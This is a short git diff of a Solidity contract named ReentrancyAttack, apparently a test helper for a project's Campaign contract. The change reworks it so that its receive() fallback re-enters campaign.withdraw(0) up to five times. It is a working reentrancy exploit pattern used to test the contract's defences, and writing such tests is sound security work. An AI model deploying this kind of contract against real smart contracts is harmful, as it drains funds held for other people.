@@ -6,25 +6,27 @@ import {Campaign} from '../../src/Campaign.sol';
 
 contract ReentrancyAttack{
     Campaign public campaign;
-    uint256 public attackAmount;
+    
+    uint256  public attackCount;
+    bool attacking;
 
 
-    constructor(address _campaign){
+    function setCampaign(address _campaign) public{
         campaign = Campaign(_campaign);
     }
 
     function attack() external payable{
-        attackAmount = msg.value;
-
-        campaign{value: msg.value}.fundCampaign();
+        attacking = true;
+        attackCount =0;
 
         campaign.withdraw(0);
     }
 
     receive() external payable{
-
-        if(address(campaign).balance >= attackAmount){
-            campaign.withdraw(0)
+        
+        if(attacking  && attackCount < 5){
+            attackCount++;
+            campaign.withdraw(0);
         }
     }
 }
